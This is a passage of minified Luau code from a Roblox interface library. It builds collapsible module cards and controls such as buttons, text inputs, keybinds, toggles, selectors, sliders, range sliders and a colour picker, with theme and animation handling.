										f.TextColor3 = k.Text
									end
								end)

								Connect(p.MouseLeave, function()
									if O.ActiveTabName ~= F then
										p.BackgroundTransparency = 1
										f.TextColor3 = k.SubText
									end
								end)

								Z.CreateModule = function(p, f, M, C)
									h()
									local Q = type(f) == "table" and f or { Name = f, Description = M, Default = C }

									local q = {
										Tab = p,
										Window = p.Window,
										Name = tostring(Q.Name or "Module"),
										Description = tostring(Q.Description or Q.Desc or ""),
										Enabled = Q.Default == true or Q.Enabled == true,
										Expanded = false,
										Controls = {},
										Callback = Q.Callback,
										NameKey = Q.NameKey,
									}

									q.Id = Q.Id and (tostring(Q.Id))
										or (Lower((q.Name:gsub("%s+", "-"):gsub("[^%w%-]", ""))))

									q.NameKey = q.NameKey or q.Id
									local l = 0.4

									local b = s("Frame", {
										Name = q.Id,
										Size = NewUDim2(1, 0, 0, 74),
										AutomaticSize = Enum.AutomaticSize.Y,
										BackgroundColor3 = k.Card,
										BackgroundTransparency = l,
										BorderColor3 = k.Border,
										BorderSizePixel = 1,
										ClipsDescendants = true,
									}, {
										P(14),
										s("UIListLayout", {
											FillDirection = Enum.FillDirection.Vertical,
											SortOrder = Enum.SortOrder.LayoutOrder,
											Padding = NewUDim(0, 0),
										}),
									})

									SetAttribute(b, "FadeTargetTransparency", l)
									q.Card = b

									Q = s("TextButton", {
										Text = "",
										AutoButtonColor = false,
										Size = NewUDim2(1, 0, 0, 74),
										BackgroundTransparency = 1,
									})

									Q.Parent = b
									q.Header = Q

									f = v({
										Text = p.Window:T(q.NameKey, q.Name),
										Position = NewUDim2(0, 12, 0, 9),
										Size = NewUDim2(1, -92, 0, 25),
										TextSize = i("ModuleTitle"),
										Font = j,
										Color = q.Enabled and p.Window.Theme.Primary or k.Text,
									})

									f.Parent = Q
									q.TitleLabel = f
									f.Text = p.Window:T(q.NameKey, q.Name)

									p.Window:_registerTheme(f, "TextColor3", "Primary", function(g)
										return q.Enabled and g or k.Text
									end)

									C = v({
										Text = "("
											.. p.Window:T(q.Tab.NameKey or q.Tab.Id or q.Tab.Key, q.Tab.Name)
											.. ")",
										Position = NewUDim2(0, 88, 0, 10),
										Size = NewUDim2(0, 100, 0, 22),
										TextSize = i("CategoryLabel"),
										Color = k.Muted,
									})

									C.Visible = false
									C.Parent = Q
									q.CategoryLabel = C

									q.LayoutHeaderText = function(g)
										if not g.TitleLabel or not g.CategoryLabel then
											return
										end
										local K = g.Header and g.Header.AbsoluteSize.X or 0
										K = if K <= 0 then 520 else K

										local _, d =
											12,
											Clamp(
												Ceil(
													y(
														g.CategoryLabel.Text,
														g.CategoryLabel.TextSize,
														g.CategoryLabel.Font
													)
												) + 6,
												58,
												118
											)

										local DD = Max(64, K - _ - 58 - d - 10)

										K = Min(
											Ceil(y(g.TitleLabel.Text, g.TitleLabel.TextSize, g.TitleLabel.Font)) + 4,
											DD
										)

										g.TitleLabel.Size = NewUDim2(0, K, 0, 25)
										g.CategoryLabel.Position = NewUDim2(0, _ + K + 6, 0, 10)
										g.CategoryLabel.Size = NewUDim2(0, d, 0, 22)
									end

									q:LayoutHeaderText()

									M = v({
										Text = p.Window:T(q.Id .. ".desc", q.Description),
										Position = NewUDim2(0, 12, 0, 39),
										Size = NewUDim2(1, -42, 0, 22),
										TextSize = i("Description"),
										Font = j,
										Color = k.SubText,
										Truncate = Enum.TextTruncate.AtEnd,
									})

									M.Parent = Q
									M.Text = p.Window:T(q.Id .. ".desc", q.Description)
									q.DescriptionLabel = M

									f = s("TextButton", {
										Text = "+",
										AutoButtonColor = false,
										Position = NewUDim2(1, -42, 0, 23),
										Size = NewUDim2(0, 26, 0, 26),
										BackgroundColor3 = NewRGB(255, 255, 255),
										BackgroundTransparency = 0.97,
										BorderColor3 = k.Border,
										BorderSizePixel = 1,
										TextColor3 = k.SubText,
										TextSize = i("GearIcon"),
										Font = j,
									}, { P(100) })

									f.Parent = Q
									q.Gear = f

									M = s("Frame", {
										Name = "Settings",
										Size = NewUDim2(1, 0, 0, 0),
										BackgroundTransparency = 1,
										ClipsDescendants = true,
									}, { J(10, 0, 12, 14) })

									M.Parent = b
									q.Body = M

									C = s("UIListLayout", {
										FillDirection = Enum.FillDirection.Vertical,
										SortOrder = Enum.SortOrder.LayoutOrder,
										Padding = NewUDim(0, 1),
									})

									C.Parent = M
									q.BodyList = C

									q._bodyHeight = function(y)
										return y.BodyList.AbsoluteContentSize.Y + 16
									end

									q._refreshBodyHeight = function(y)
										if y.Expanded then
											w(y.Body, { Size = NewUDim2(1, 0, 0, y:_bodyHeight()) }, 0.18)
										end
									end

									q.SetExpanded = function(y, M)
										y.Expanded = M == true
										M = y.Expanded and (y:_bodyHeight()) or 0
										w(y.Body, { Size = NewUDim2(1, 0, 0, M) }, 0.24)

										if y.Expanded then
											I(y.Gear, y.Window.Theme.Primary, y.Window.Theme.Accent, nil, y.Window)
										else
											u(y.Gear, y.Window)
											y.Gear.TextColor3 = k.SubText
										end

										y.Gear.Rotation = y.Expanded and 45 or 0
									end

									q.Set = function(y, M, C)
										y.Enabled = M == true

										if y.Enabled then
											I(
												y.TitleLabel,
												y.Window.Theme.Primary,
												y.Window.Theme.Accent,
												nil,
												y.Window
											)
										else
											u(y.TitleLabel, y.Window)
											w(y.TitleLabel, { TextColor3 = k.Text }, 0.18)
										end

										if not C then
											H(y.Callback, y.Enabled)
										end
									end

									q.Get = function(y)
										return y.Enabled
									end

									q._row = function(y, M, C, g)
										local K = s("Frame", {
											Size = NewUDim2(1, 0, 0, y.Window.RowHeight),
											BackgroundColor3 = NewRGB(255, 255, 255),
											BackgroundTransparency = 1,
											BorderSizePixel = 0,
										})

										SetAttribute(K, "OpenHeight", y.Window.RowHeight)
										K.Parent = y.Body
										local _ = 0

										if C then
											s("Frame", {
												Position = NewUDim2(0, 18, 0, -1),
												Size = NewUDim2(0, 2, 1, 2),
												BackgroundColor3 = k.Line,
												BorderSizePixel = 0,
											}).Parent =
												K

											_ = 34
										end

										C = v({
											Text = M,
											Position = NewUDim2(0, _, 0, 0),
											Size = NewUDim2(0.42, -_, 1, 0),
											TextSize = i("ControlText"),
											Color = k.Text,
										})

										C.Parent = K

										if g then
											C.Text = g(M)
										end

										Connect(K.MouseEnter, function()
											K.BackgroundTransparency = 0.985
										end)

										Connect(K.MouseLeave, function()
											K.BackgroundTransparency = 1
										end)

										if y.Expanded then
											y:SetExpanded(true)
										end

										return K, C
									end

									q._setControlVisible = function(y, M, C)
										if not M or not M.Row then
											return
										end
										M.Visible = C == true
										M.Row.Visible = M.Visible

										M.Row.Size = M.Visible
												and (NewUDim2(
													1,
													0,
													0,
													GetAttribute(M.Row, "OpenHeight") or y.Window.RowHeight
												))
											or (NewUDim2(1, 0, 0, 0))

										C = M.ExtraRows or {}

										for g = 1, #C, 1 do
											local K = C[g]
											K.Visible = M.Visible and GetAttribute(K, "Opened") == true

											K.Size = K.Visible
													and (NewUDim2(1, 0, 0, GetAttribute(K, "OpenHeight") or 0))
												or (NewUDim2(1, 0, 0, 0))
										end

										y:_refreshBodyHeight()
									end

									q._attachParent = function(y, M, C)
										if not C then
											return
										end
										C.Dependents = C.Dependents or {}
										Insert(C.Dependents, M)
										M.ParentControl = C
										y:_setControlVisible(M, C.Value == true)
									end

									q.CreateButton = function(y, M, C)
										local g = type(M) == "table" and M or { Name = M, Callback = C }

										local K = {
											Type = "Button",
											Id = tostring(g.Id or g.Name),
											Name = tostring(g.Name or "Button"),
											Callback = g.Callback,
											Module = y,
											Parent = g.Parent or g.ParentControl,
										}

										C, M = y:_row(K.Name, g.Nested)
										K.Row = C
										K.NameKey = g.NameKey
										K.NameLabel = M
										M.Text = y.Window:T(K.NameKey or K.Id, K.Name)
										M.Font = j

										Connect(C.InputBegan, function(M)
											if
												M.UserInputType == Enum.UserInputType.MouseButton1
												or M.UserInputType == Enum.UserInputType.Touch
											then
												H(K.Callback)
											end
										end)

										K.Fire = function(M)
											H(M.Callback)
										end

										K.Get = function(M)
											return nil
										end

										Insert(y.Controls, K)
										Insert(y.Window.Controls, K)
										y:_attachParent(K, K.Parent)
										return K
									end

									q.CreateInput = function(y, M, C, g)
										local K = type(M) == "table" and M or { Name = M, Default = C, Callback = g }

										local g = {
											Type = "Input",
											Id = tostring(K.Id or K.Name),
											Name = tostring(K.Name or "Input"),
											Value = tostring(K.Default or K.Value or ""),
											Callback = K.Callback,
											Module = y,
											Parent = K.Parent or K.ParentControl,
										}

										M, C = y:_row(g.Name, K.Nested)
										g.Row = M
										g.NameKey = K.NameKey
										g.NameLabel = C
										C.Text = y.Window:T(g.NameKey or g.Id, g.Name)

										local C = s("TextBox", {
											Text = g.Value,
											PlaceholderText = K.Placeholder or K.PlaceholderText or "",
											Position = NewUDim2(1, -160, 0.5, -11),
											Size = NewUDim2(0, 146, 0, 22),
											BackgroundColor3 = k.TrackHover,
											BorderColor3 = k.Border,
											BorderSizePixel = 1,
											TextColor3 = k.Text,
											PlaceholderColor3 = k.Muted,
											TextSize = i("InputBox"),
											Font = j,
											ClearTextOnFocus = false,
										}, { P(4) })

										C.Parent = M

										Connect(C.FocusLost, function()
											g.Value = C.Text
											H(g.Callback, g.Value)
										end)

										g.Set = function(M, _, d)
											M.Value = tostring(_ or "")
											C.Text = M.Value

											if not d then
												H(M.Callback, M.Value)
											end
										end

										g.Get = function(M)
											return M.Value
										end

										Insert(y.Controls, g)
										Insert(y.Window.Controls, g)
										y:_attachParent(g, g.Parent)

										if K.Default ~= nil then
											H(g.Callback, g.Value)
										end

										return g
									end

									q.CreateKeybind = function(y, M, C, g)
										local K = type(M) == "table" and M or { Name = M, Default = C, Callback = g }

										local _ = {
											Type = "Keybind",
											Id = tostring(K.Id or K.Name),
											Name = tostring(K.Name or "Keybind"),
											KeyCode = a(K.Default or K.CurrentKey or K.Keybind or K.KeyCode, nil),
											Callback = K.Callback,
											Module = y,
											Parent = K.Parent or K.ParentControl,
											Capturing = false,
										}

										g, C = y:_row(_.Name, K.Nested)
										_.Row = g
										_.NameKey = K.NameKey
										_.NameLabel = C
										C.Text = y.Window:T(_.NameKey or _.Id, _.Name)

										local C = s("TextButton", {
											Text = L(_.KeyCode),
											AutoButtonColor = false,
											Position = NewUDim2(1, -92, 0.5, -11),
											Size = NewUDim2(0, 78, 0, 22),
											BackgroundColor3 = k.TrackHover,
											BorderColor3 = k.Border,
											BorderSizePixel = 1,
											TextColor3 = k.Text,
											TextSize = i("KeybindBox"),
											Font = j,
										}, { P(4) })

										C.Parent = g

										local function g(d)
											_.Capturing = d == true
											C.Text = _.Capturing and "..." or (L(_.KeyCode))

											if _.Capturing then
												I(C, y.Window.Theme.Primary, y.Window.Theme.Accent, nil, y.Window)
											else
												u(C, y.Window)
												C.BackgroundColor3 = k.TrackHover
												C.TextColor3 = k.Text
											end
										end

										Connect(C.MouseButton1Click, function()
											g(true)
										end)

										_.Connection = Connect(D.InputBegan, function(d, DD)
											if not _.Capturing then
												return
											end

											if D:GetFocusedTextBox() then
												return
											end

											if
												d.UserInputType == Enum.UserInputType.Keyboard
												and d.KeyCode ~= Enum.KeyCode.Unknown
											then
												_:Set(d.KeyCode, true)
												g(false)
											elseif DD then
												g(false)
											end
										end)

										_.Set = function(g, d, DD)
											g.KeyCode = a(d, g.KeyCode)
											C.Text = L(g.KeyCode)

											if not DD then
												H(g.Callback, g.KeyCode)
											end
										end

										_.Get = function(a)
											return a.KeyCode and a.KeyCode.Name
										end

										Insert(y.Controls, _)
										Insert(y.Window.Controls, _)
										Insert(y.Window.Keybinds, _)
										y:_attachParent(_, _.Parent)
										M = K.Default ~= nil
										return _
									end

									q.CreateToggle = function(a, L, y, M)
										local C = type(L) == "table" and L or { Name = L, Default = y, Callback = M }

										local M = {
											Type = "Toggle",
											Id = tostring(C.Id or C.Name),
											Name = tostring(C.Name or "Toggle"),
											Value = C.Default == true,
											Callback = C.Callback,
											Module = a,
											Parent = C.Parent or C.ParentControl,
											Dependents = {},
										}

										L, y = a:_row(M.Name, C.Nested)
										M.Row = L
										M.NameKey = C.NameKey
										M.NameLabel = y
										y.Text = a.Window:T(M.NameKey or M.Id, M.Name)

										s("Frame", {
											Position = NewUDim2(
												1,
												-(14 + a.Window.ToggleSize),
												0.5,
												-Floor(a.Window.ToggleSize / 2)
											),
											Size = NewUDim2(0, a.Window.ToggleSize, 0, a.Window.ToggleSize),
											BackgroundColor3 = k.Track,
											BorderSizePixel = 0,
										}, { P(100) }).Parent =
											L

										local y = s("TextButton", {
											Text = "",
											AutoButtonColor = false,
											Position = NewUDim2(
												1,
												-(14 + a.Window.ToggleSize),
												0.5,
												-Floor(a.Window.ToggleSize / 2)
											),
											Size = NewUDim2(0, a.Window.ToggleSize, 0, a.Window.ToggleSize),
											BackgroundColor3 = a.Window.Theme.Primary,
											BackgroundTransparency = M.Value and 0 or 1,
											BorderColor3 = M.Value and a.Window.Theme.Primary or k.Muted,
											BorderSizePixel = 1,
										}, { P(100) })

										y.Parent = L
										a.Window:_registerTheme(y, "BackgroundColor3", "Primary", nil, true)

										M.Set = function(g, K, _)
											g.Value = K == true
											y.BackgroundTransparency = g.Value and 0 or 1
											y.BorderColor3 = g.Value and g.Module.Window.Theme.Primary or k.Muted
											K = g.Dependents or {}

											for y = 1, #K, 1 do
												local d = K[y]
												g.Module:_setControlVisible(d, g.Value)
											end

											if not _ then
												H(g.Callback, g.Value)
											end
										end

										M.Get = function(y)
											return y.Value
										end

										Connect(L.InputBegan, function(L)
											if
												L.UserInputType == Enum.UserInputType.MouseButton1
												or L.UserInputType == Enum.UserInputType.Touch
											then
												M:Set(not M.Value)
											end
										end)

										Insert(a.Controls, M)
										Insert(a.Window.Controls, M)
										a:_attachParent(M, M.Parent)

										if C.Default ~= nil then
											H(M.Callback, M.Value)
										end

										return M
									end

									q.CreateSelector = function(a, L, y, M, C)
										local g = type(L) == "table" and L
											or {
												Name = L,
												Options = y,
												Default = M,
												Callback = C,
											}

										L = g.Options or g.Values or {}

										local y = {
											Type = "Selector",
											Id = tostring(g.Id or g.Name),
											Name = tostring(g.Name or "Selector"),
											Options = L,
											Value = g.Default,
											Callback = g.Callback,
											Module = a,
											Parent = g.Parent or g.ParentControl,
											_optionValue = function(M, M)
												if type(M) == "table" then
													return M.Value or M.Id or M.Text or M.Name or ""
												end
												return M
											end,
											_optionText = function(M, C)
												for K = 1, #M.Options, 1 do
													local _ = M.Options[K]
													K = M:_optionValue(_)

													if K == C then
														if type(_) == "table" then
															return _.Text or _.Name or K
														end
														return tostring(K)
													end
												end

												return tostring(C)
											end,
											_optionIndex = function(M, C)
												for K = 1, #M.Options, 1 do
													if M:_optionValue(M.Options[K]) == C then
														return K
													end
												end

												return nil
											end,
										}

										if y.Value == nil and L[1] ~= nil then
											y.Value = y:_optionValue(L[1])
										end

										if y.Value == nil then
											y.Value = ""
										end

										local L, M = a:_row(y.Name, g.Nested, function(C)
											return a.Window:T(y.NameKey or y.Id, y.Name)
												.. ": "
												.. y:_optionText(y.Value)
										end)

										y.Row = L
										y.NameKey = g.NameKey
										y.NameLabel = M

										y.Set = function(C, K, _)
											if #C.Options > 0 and not C:_optionIndex(K) then
												return
											end
											C.Value = K

											M.Text = C.Module.Window:T(C.NameKey or C.Id, C.Name)
												.. ": "
												.. C:_optionText(C.Value)

											if not _ then
												H(C.Callback, C.Value)
											end
										end

										y.Get = function(M)
											return M.Value
										end

										Connect(L.InputBegan, function(L)
											if
												L.UserInputType == Enum.UserInputType.MouseButton1
												or L.UserInputType == Enum.UserInputType.Touch
											then
												if #y.Options == 0 then
													return
												end
												local L = (y:_optionIndex(y.Value) or 1) % #y.Options + 1
												y:Set(y:_optionValue(y.Options[L]))
											end
										end)

										Insert(a.Controls, y)
										Insert(a.Window.Controls, y)
										a:_attachParent(y, y.Parent)

										if g.Default ~= nil then
											H(y.Callback, y.Value)
										end

										return y
									end

									q.CreateSlider = function(a, L, y, M, C, g)
										local K = e(L, y, M, C, g)
										g, y, M = tonumber(K.Min) or 0, tonumber(K.Max) or 100, tonumber(K.Step) or 1

										local L = {
											Type = "Slider",
											Id = tostring(K.Id or K.Name),
											Name = tostring(K.Name or "Slider"),
											Min = g,
											Max = y,
											Step = M,
											Value = G(K.Default or K.CurrentValue or g, g, y, M),
											Callback = K.Callback,
											Module = a,
											Parent = K.Parent or K.ParentControl,
										}

										C, g = a:_row(L.Name, K.Nested)
										L.Row = C
										L.NameKey = K.NameKey
										L.NameLabel = g
										g.Text = a.Window:T(L.NameKey or L.Id, L.Name)
										g, y = a.Window.IsMobile and 0.38 or 0.42, a.Window.IsMobile and 0.44 or 0.38

										local M = s("TextButton", {
											Text = "",
											AutoButtonColor = false,
											Position = NewUDim2(g, 0, 0.5, -Floor(a.Window.SliderHitHeight / 2)),
											Size = NewUDim2(y, -42, 0, a.Window.SliderHitHeight),
											BackgroundColor3 = k.Track,
											BackgroundTransparency = 1,
											BorderSizePixel = 0,
										})

										M.Parent = C

										g = s("Frame", {
											Position = NewUDim2(0, 0, 0.5, -2),
											Size = NewUDim2(1, 0, 0, 4),
											BackgroundColor3 = k.Track,
											BorderSizePixel = 0,
										}, { P(100) })

										g.Parent = M

										local y = s("Frame", {
											Size = NewUDim2(0, 0, 1, 0),
											BackgroundColor3 = a.Window.Theme.Primary,
											BorderSizePixel = 0,
										}, { P(100) })

										y.Parent = g
										a.Window:_registerTheme(y, "BackgroundColor3", "Primary", nil, true)

										local g = s("Frame", {
											AnchorPoint = NewVector2(0.5, 0.5),
											Position = NewUDim2(0, 0, 0.5, 0),
											Size = NewUDim2(
												0,
												a.Window.IsMobile and 13 or 9,
												0,
												a.Window.IsMobile and 13 or 9
											),
											BackgroundColor3 = a.Window.Theme.Primary,
											BorderSizePixel = 0,
										}, { P(100) })

										g.Parent = M
										a.Window:_registerTheme(g, "BackgroundColor3", "Primary", nil, true)

										local _ = s("TextBox", {
											Text = n(L.Value),
											ClearTextOnFocus = false,
											Position = NewUDim2(1, -68, 0, 0),
											Size = NewUDim2(0, 60, 1, 0),
											BackgroundColor3 = NewRGB(255, 255, 255),
											BackgroundTransparency = 1,
											BorderColor3 = a.Window.Theme.Primary,
											BorderSizePixel = 0,
											TextColor3 = k.Text,
											TextSize = i("ValueBox"),
											Font = j,
											TextXAlignment = Enum.TextXAlignment.Center,
										}, { P(3) })

										_.Parent = C

										L._render = function(C)
											local d = (C.Value - C.Min) / Max(C.Max - C.Min, 0.001)
											w(y, { Size = NewUDim2(d, 0, 1, 0) }, 0.15)
											w(g, { Position = NewUDim2(d, 0, 0.5, 0) }, 0.15)
											_.Text = n(C.Value)
										end

										L.Set = function(y, C, g)
											y.Value = G(C, y.Min, y.Max, y.Step)
											y:_render()

											if not g then
												H(y.Callback, y.Value)
											end
										end

										L.Get = function(y)
											return y.Value
										end

										local y = false

										local function C(g)
											local d = Clamp((g - M.AbsolutePosition.X) / Max(M.AbsoluteSize.X, 1), 0, 1)
											L:Set(L.Min + d * (L.Max - L.Min))
										end

										Connect(M.InputBegan, function(M)
											if
												M.UserInputType == Enum.UserInputType.MouseButton1
												or M.UserInputType == Enum.UserInputType.Touch
											then
												y = true
												C(M.Position.X)
											end
										end)

										Connect(D.InputChanged, function(M)
											if
												y
												and (
													M.UserInputType == Enum.UserInputType.MouseMovement
													or M.UserInputType == Enum.UserInputType.Touch
												)
											then
												C(M.Position.X)
											end
										end)

										Connect(D.InputEnded, function(M)
											local C = M.UserInputType == Enum.UserInputType.MouseButton1
												or M.UserInputType == Enum.UserInputType.Touch

											if C then
												y = false
											end
										end)

										T(_, function(y)
											local M = tonumber(y)

											if M then
												L:Set(M)
											else
												L:_render()
											end
										end)

										L:_render()
										Insert(a.Controls, L)
										Insert(a.Window.Controls, L)
										a:_attachParent(L, L.Parent)

										if K.Default ~= nil then
											H(L.Callback, L.Value)
										end

										return L
									end

									q.CreateDoubleSlider = function(a, L, y, M, C, g)
										local K = e(L, y, M, C, g)
										C, M, L = tonumber(K.Min) or 0, tonumber(K.Max) or 100, tonumber(K.Step) or 1
										g = K.Default or K.CurrentValue or { C, M }
										local e, y = G(g[1] or C, C, M, L), G(g[2] or M, C, M, L)

										if e > y then
											e, y = y, e
										end

										local _ = {
											Type = "DoubleSlider",
											Id = tostring(K.Id or K.Name),
											Name = tostring(K.Name or "DoubleSlider"),
											Min = C,
											Max = M,
											Step = L,
											Low = e,
											High = y,
											Callback = K.Callback,
											Module = a,
											Parent = K.Parent or K.ParentControl,
										}

										g, L = a:_row(_.Name, K.Nested)
										_.Row = g
										_.NameKey = K.NameKey
										_.NameLabel = L
										L.Text = a.Window:T(_.NameKey or _.Id, _.Name)
										e, L = a.Window.IsMobile and 0.38 or 0.42, a.Window.IsMobile and 0.44 or 0.38

										local y = s("TextButton", {
											Text = "",
											AutoButtonColor = false,
											Position = NewUDim2(e, 0, 0.5, -Floor(a.Window.SliderHitHeight / 2)),
											Size = NewUDim2(L, -42, 0, a.Window.SliderHitHeight),
											BackgroundColor3 = k.Track,
											BackgroundTransparency = 1,
											BorderSizePixel = 0,
										})

										y.Parent = g

										L = s("Frame", {
											Position = NewUDim2(0, 0, 0.5, -2),
											Size = NewUDim2(1, 0, 0, 4),
											BackgroundColor3 = k.Track,
											BorderSizePixel = 0,
										}, { P(100) })

										L.Parent = y

										local e = s(
											"Frame",
											{ BackgroundColor3 = a.Window.Theme.Primary, BorderSizePixel = 0 },
											{ P(100) }
										)

										e.Parent = L
										a.Window:_registerTheme(e, "BackgroundColor3", "Primary", nil, true)

										local L = s("Frame", {
											AnchorPoint = NewVector2(0.5, 0.5),
											Size = NewUDim2(
												0,
												a.Window.IsMobile and 13 or 9,
												0,
												a.Window.IsMobile and 13 or 9
											),
											BackgroundColor3 = a.Window.Theme.Primary,
											BorderSizePixel = 0,
										}, { P(100) })

										L.Parent = y
										a.Window:_registerTheme(L, "BackgroundColor3", "Primary", nil, true)

										local M = s("Frame", {
											AnchorPoint = NewVector2(0.5, 0.5),
											Size = NewUDim2(
												0,
												a.Window.IsMobile and 13 or 9,
												0,
												a.Window.IsMobile and 13 or 9
											),
											BackgroundColor3 = a.Window.Theme.Primary,
											BorderSizePixel = 0,
										}, { P(100) })

										M.Parent = y
										a.Window:_registerTheme(M, "BackgroundColor3", "Primary", nil, true)

										local C = s("TextBox", {
											Text = "",
											ClearTextOnFocus = false,
											Position = NewUDim2(1, -82, 0, 0),
											Size = NewUDim2(0, 74, 1, 0),
											BackgroundColor3 = NewRGB(255, 255, 255),
											BackgroundTransparency = 1,
											BorderColor3 = a.Window.Theme.Primary,
											BorderSizePixel = 0,
											TextColor3 = k.Text,
											TextSize = i("ValueBox"),
											Font = j,
											TextXAlignment = Enum.TextXAlignment.Center,
										}, { P(3) })

										C.Parent = g

										_._render = function(g)
											local d = Max(g.Max - g.Min, 0.001)
											local DD, HD = (g.Low - g.Min) / d, (g.High - g.Min) / d

											w(
												e,
												{ Position = NewUDim2(DD, 0, 0, 0), Size = NewUDim2(HD - DD, 0, 1, 0) },
												0.15
											)

											w(L, { Position = NewUDim2(DD, 0, 0.5, 0) }, 0.15)
											w(M, { Position = NewUDim2(HD, 0, 0.5, 0) }, 0.15)
											C.Text = n(g.Low) .. " " .. n(g.High)
										end

										_.Set = function(e, n, L)
											if type(n) ~= "table" then
												return
											end
											local M, g = G(n[1], e.Min, e.Max, e.Step), G(n[2], e.Min, e.Max, e.Step)

											if M > g then
												g, M = M, g
											end

											e.Low = M
											e.High = g
											e:_render()

											if not L then
												H(e.Callback, e.Low, e.High)
											end
										end

										_.Get = function(e)
											return { e.Low, e.High }
										end

										local e

										local function n(L)
											local G = Clamp((L - y.AbsolutePosition.X) / Max(y.AbsoluteSize.X, 1), 0, 1)
											return _.Min + G * (_.Max - _.Min)
										end

										local function L(G)
											local M = n(G)

											if e == "Low" then
												_:Set({ M, _.High })
											else
												_:Set({ _.Low, M })
											end
										end

										Connect(y.InputBegan, function(y)
											if
												y.UserInputType == Enum.UserInputType.MouseButton1
												or y.UserInputType == Enum.UserInputType.Touch
											then
												local G = n(y.Position.X)
												e = Abs(G - _.Low) <= Abs(G - _.High) and "Low" or "High"
												L(y.Position.X)
											end
										end)

										Connect(D.InputChanged, function(n)
											if
												e
												and (
													n.UserInputType == Enum.UserInputType.MouseMovement
													or n.UserInputType == Enum.UserInputType.Touch
												)
											then
												L(n.Position.X)
											end
										end)

										Connect(D.InputEnded, function(n)
											local L = n.UserInputType == Enum.UserInputType.MouseButton1
												or n.UserInputType == Enum.UserInputType.Touch

											if L then
												e = nil
											end
										end)

										T(C, function(e)
											local n = {}

											for L in string.gmatch(e, "[-%d%.]+") do
												Insert(n, tonumber(L))
											end

											if #n >= 2 then
												_:Set({ n[1], n[2] })
											else
												_:_render()
											end
										end)

										_:_render()
										Insert(a.Controls, _)
										Insert(a.Window.Controls, _)
										a:_attachParent(_, _.Parent)

										if K.Default ~= nil then
											H(_.Callback, _.Low, _.High)
										end

										return _
									end

									q.CreateColorPicker = function(e, n, a, L)
										local y = type(n) == "table" and n or { Name = n, Default = a, Callback = L }
										n = S(y.Color or y.Default or y.CurrentValue, NewRGB(56, 189, 248))

										local a = {
											Type = "ColorPicker",
											Id = tostring(y.Id or y.Name),
											Name = tostring(y.Name or "Color"),
											Value = n,
											Callback = y.Callback,
											Module = e,
											Parent = y.Parent or y.ParentControl,
											Opened = y.Open == true or y.Opened == true,
											ExtraRows = {},
										}

										n, L = e:_row(a.Name, y.Nested)
										a.Row = n
										a.NameKey = y.NameKey
										a.NameLabel = L
										L.Text = e.Window:T(a.NameKey or a.Id, a.Name)

										local G = v({
											Text = r(a.Value),
											Position = NewUDim2(1, -104, 0, 0),
											Size = NewUDim2(0, 66, 1, 0),
											TextSize = i("HexLabel"),
											Font = j,
											Color = k.SubText,
											X = Enum.TextXAlignment.Right,
										})

										G.Parent = n

										local T = s("TextButton", {
											Text = "",
											AutoButtonColor = false,
											Position = NewUDim2(1, -28, 0.5, -7),
											Size = NewUDim2(0, 18, 0, 14),
											BackgroundColor3 = a.Value,
											BorderColor3 = k.Border,
											BorderSizePixel = 1,
										}, { P(2) })

										T.Parent = n
										local n = e.Window.IsMobile and 94 or 82

										local M = s("Frame", {
											Size = NewUDim2(1, 0, 0, a.Opened and n or 0),
											BackgroundColor3 = k.Track,
											BorderColor3 = k.Border,
											BorderSizePixel = 1,
											Visible = a.Opened,
											ClipsDescendants = true,
										}, { P(5), J(7, 7, 7, 7) })

										SetAttribute(M, "OpenHeight", n)
										SetAttribute(M, "Opened", a.Opened)
										M.Parent = e.Body
										Insert(a.ExtraRows, M)
										L = e.Window.IsMobile and 58 or 48

										local C = s("ImageButton", {
											Size = NewUDim2(1, 0, 0, L),
											BackgroundColor3 = NewRGB(255, 0, 0),
											BorderSizePixel = 0,
											Image = "rbxassetid://4155801252",
											AutoButtonColor = false,
										}, { P(3) })

										C.Parent = M

										local g = s("TextButton", {
											Text = "",
											AutoButtonColor = false,
											Size = NewUDim2(1, 0, 0, e.Window.IsMobile and 16 or 12),
											Position = NewUDim2(0, 0, 0, L + 8),
											BackgroundColor3 = NewRGB(255, 255, 255),
											BorderSizePixel = 0,
										}, {
											P(100),
											s("UIGradient", {
												Color = ColorSequence.new({
													ColorSequenceKeypoint.new(0, NewRGB(255, 0, 0)),
													ColorSequenceKeypoint.new(0.167, NewRGB(255, 255, 0)),
													ColorSequenceKeypoint.new(0.333, NewRGB(0, 255, 0)),
													ColorSequenceKeypoint.new(0.5, NewRGB(0, 255, 255)),
													ColorSequenceKeypoint.new(0.667, NewRGB(0, 0, 255)),
													ColorSequenceKeypoint.new(0.833, NewRGB(255, 0, 255)),
													ColorSequenceKeypoint.new(1, NewRGB(255, 0, 0)),
												}),
											}),
										})

										g.Parent = M

										local L = s("Frame", {
											AnchorPoint = NewVector2(0.5, 0.5),
											Size = NewUDim2(0, 8, 0, 8),
											BackgroundColor3 = NewRGB(255, 255, 255),
											BorderColor3 = NewRGB(0, 0, 0),
											BorderSizePixel = 1,
										}, { P(100) })

										L.Parent = C

										local K = s("Frame", {
											AnchorPoint = NewVector2(0.5, 0.5),
											Size = NewUDim2(0, 5, 1, 4),
											Position = NewUDim2(0, 0, 0.5, 0),
											BackgroundColor3 = NewRGB(255, 255, 255),
											BorderColor3 = NewRGB(0, 0, 0),
											BorderSizePixel = 1,
										}, { P(100) })

										K.Parent = g
										local _, d, DD = a.Value:ToHSV()
										local HD, mD = false, false

										local function hD()
											a.Value = Color3.fromHSV(_, d, DD)
											C.BackgroundColor3 = Color3.fromHSV(_, 1, 1)
											T.BackgroundColor3 = a.Value
											G.Text = r(a.Value)
											L.Position = NewUDim2(d, 0, 1 - DD, 0)
											K.Position = NewUDim2(_, 0, 0.5, 0)
										end

										local function r()
											H(a.Callback, a.Value)
										end

										local function L(G)
											a.Opened = G == true
											SetAttribute(M, "Opened", a.Opened)
											M.Visible = a.Opened and a.Visible ~= false
											M.Size = M.Visible and (NewUDim2(1, 0, 0, n)) or (NewUDim2(1, 0, 0, 0))
											e:_refreshBodyHeight()
										end

										local function n(G)
											local M, K =
												Clamp(G.Position.X - C.AbsolutePosition.X, 0, C.AbsoluteSize.X),
												Clamp(G.Position.Y - C.AbsolutePosition.Y, 0, C.AbsoluteSize.Y)

											d = M / Max(C.AbsoluteSize.X, 1)
											DD = 1 - K / Max(C.AbsoluteSize.Y, 1)
											hD()
											r()
										end

										local function G(M)
											_ = Clamp(M.Position.X - g.AbsolutePosition.X, 0, g.AbsoluteSize.X)
												/ Max(g.AbsoluteSize.X, 1)

											hD()
											r()
										end

										Connect(T.MouseButton1Click, function()
											L(not a.Opened)
										end)

										Connect(C.InputBegan, function(L)
											if
												L.UserInputType == Enum.UserInputType.MouseButton1
